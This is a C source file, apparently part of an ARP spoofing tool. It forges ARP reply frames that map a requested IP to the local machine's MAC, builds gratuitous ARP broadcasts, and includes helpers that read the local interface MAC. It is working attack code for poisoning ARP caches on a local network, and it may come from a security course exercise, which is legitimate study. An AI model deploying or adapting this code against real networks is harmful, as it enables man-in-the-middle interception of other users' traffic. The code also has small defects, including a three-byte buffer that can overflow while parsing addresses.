#include "main.h"

void fill_address_test(char *address, uint8_t *mac_address, size_t base, char sep)
{
    char octects[3];
    int j = 0, k = 0;
    for(int i = 0; address[i] != '\0'; i++)
    {
        if(address[i] != sep)
        {
            octects[j] = address[i];
            j++;
        }
        if (address[i] == sep)
        {
            octects[j] = '\0';
            mac_address[k] = pos_ascii_hex_int_to_int(octects, base);
            k++;
            j = 0;
        }
    }
    octects[j] = '\0';
    mac_address[k] = pos_ascii_hex_int_to_int(octects, base);
}

void fill_adress(unsigned char *src, unsigned char *dest, int size)
{
    for(int i = 0; i < size; i++)
    {
        dest[i] = src[i];
    }
}

bool get_my_address_MAC(unsigned char *dest)
{
    struct ifaddrs *all_interface, *temp;

    if ((getifaddrs(&all_interface)) != 0)
        return(printf("getifaddrs error: %s\n", strerror(errno)), false);
    temp = all_interface;
    while(temp != NULL)
    {
        if (temp->ifa_addr->sa_family == AF_PACKET && strcmp(temp->ifa_name, "lo") != 0)
        {
            struct sockaddr_ll *interface = (struct sockaddr_ll *)temp->ifa_addr;
            for(int i = 0; i < 6; i++)
            {
                dest[i] = interface->sll_addr[i];
            }
            break;
        }
        temp = temp->ifa_next;
    }
    if (temp == NULL)
            return(printf("No interface found for send arp spoofing\n"), false);
    freeifaddrs(all_interface);
    return (true);
}

bool create_frame_unicast_request(struct arp_frame *send_frame, struct arp_frame *recv_frame)
{
    memcpy(send_frame->ether_dest_mac, recv_frame->ether_src_mac, ETH_ALEN);
    // fill_adress(recv_frame->ether_src_mac, send_frame->ether_dest_mac, 6);
    if (!(get_my_address_MAC(send_frame->ether_src_mac)))
        return (false);
    send_frame->ether_type = htons(0x0806);
    send_frame->hardware_type = htons(0x0001);
    send_frame->ip_size = 0x04;
    send_frame->mac_size = 0x06;
    send_frame->op_code = htons(0x0002);
    send_frame->protocole_type = htons(0x0800);
    memcpy(send_frame->sender_ip, recv_frame->target_ip, 4);
    // fill_adress(recv_frame->target_ip, send_frame->sender_ip, 4);
    if (!(get_my_address_MAC(send_frame->sender_mac)))
        return (false);
    memcpy(send_frame->target_ip, recv_frame->sender_ip, 4);
    memcpy(send_frame->target_mac, recv_frame->sender_mac, ETH_ALEN);
    // fill_adress(recv_frame->sender_ip, send_frame->target_ip, 4);
    // fill_adress(recv_frame->sender_mac, send_frame->target_mac, 6);
    return (true);
}

bool create_frame_gatuitous(struct arp_frame *send_frame, char *ip)
{
    // uint8_t mac_broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    memset(send_frame->ether_dest_mac, 0xff, ETH_ALEN);
    // fill_adress(mac_broadcast, send_frame->ether_dest_mac, 6);
    if (!(get_my_address_MAC(send_frame->ether_src_mac)))
        return (false);
    send_frame->ether_type = htons(0x0806);
    send_frame->hardware_type = htons(0x0001);
    send_frame->ip_size = 0x04;
    send_frame->mac_size = 0x06;
    send_frame->op_code = htons(0x0001);
    send_frame->protocole_type = htons(0x0800);
    inet_pton(AF_INET, ip, send_frame->sender_ip);
    if (!(get_my_address_MAC(send_frame->sender_mac)))
        return (false);
    inet_pton(AF_INET, ip, send_frame->target_ip);
    memset(send_frame->target_mac, 0xff, ETH_ALEN);
    // fill_adress(mac_broadcast, send_frame->target_mac, 6);
    return (true);
}